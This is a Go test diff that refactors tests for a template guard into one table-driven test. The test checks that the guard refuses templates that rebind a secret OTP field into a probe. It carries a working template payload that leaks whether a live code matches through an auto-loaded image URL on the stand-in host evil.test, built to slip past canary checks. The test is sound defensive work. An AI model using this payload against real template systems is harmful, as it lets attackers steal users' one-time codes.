@@ -61,31 +61,29 @@ func TestGuardRefusesDollarQualifiedSecretOracles(t *testing.T) {
 	}
 }
 
+// Dual-type define: alone under TemplateData it emits "false"; called with the
+// secret under canaries it also emits "false"; the live OTP "000000" emits
+// "true" into an auto-loaded img src. Before the TemplateNode walk both of these
+// passed guardTemplate and beaconed. The refusal is matched on the sentence the
+// TemplateNode arm writes, because the bare word "template" appears in nearly
+// every refusal this guard produces.
 func TestGuardRefusesTemplateRebindOfSecret(t *testing.T) {
-	// Dual-type define: alone under TemplateData it emits "false"; called with
-	// .Code under canaries it also emits "false"; live OTP "000000" emits "true"
-	// into an auto-loaded img src. Before the TemplateNode walk this passed
-	// guardTemplate and beaconed.
-	src := `{{define "probe"}}{{if eq (printf "%T" .) "string"}}{{eq . "000000"}}{{else}}false{{end}}{{end}}` +
-		`<p>x</p><img src="https://evil.test/c/{{template "probe" .Code}}">`
-	err := guardTemplate([]byte(src))
-	if err == nil {
-		t.Fatalf("guardTemplate ACCEPTED a {{template}} that rebinds the secret as dot: %s", src)
-	}
-	if !strings.Contains(err.Error(), "template") {
-		t.Fatalf("refused for the wrong reason (want template-rebind refusal): %v", err)
-	}
-}
+	const probe = `{{define "probe"}}{{if eq (printf "%T" .) "string"}}{{eq . "000000"}}{{else}}false{{end}}{{end}}`
 
-func TestGuardRefusesTemplateRebindOfDollarSecret(t *testing.T) {
-	src := `{{define "probe"}}{{if eq (printf "%T" .) "string"}}{{eq . "000000"}}{{else}}false{{end}}{{end}}` +
-		`<p>x</p><img src="https://evil.test/c/{{template "probe" $.Code}}">`
-	err := guardTemplate([]byte(src))
-	if err == nil {
-		t.Fatalf("guardTemplate ACCEPTED a {{template}} that rebinds $.Code as dot: %s", src)
-	}
-	if !strings.Contains(err.Error(), "template") {
-		t.Fatalf("refused for the wrong reason (want template-rebind refusal): %v", err)
+	for _, tc := range []struct{ name, arg string }{
+		{"field argument", ".Code"},
+		{"dollar-rooted argument", "$.Code"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			src := probe + `<p>x</p><img src="https://evil.test/c/{{template "probe" ` + tc.arg + `}}">`
+			err := guardTemplate([]byte(src))
+			if err == nil {
+				t.Fatalf("guardTemplate ACCEPTED a {{template}} that rebinds %s as dot: %s", tc.arg, src)
+			}
+			if !strings.Contains(err.Error(), "{{template}} call passes the link, token or code") {
+				t.Fatalf("refused for the wrong reason (want the template-rebind refusal): %v", err)
+			}
+		})
 	}
 }
 
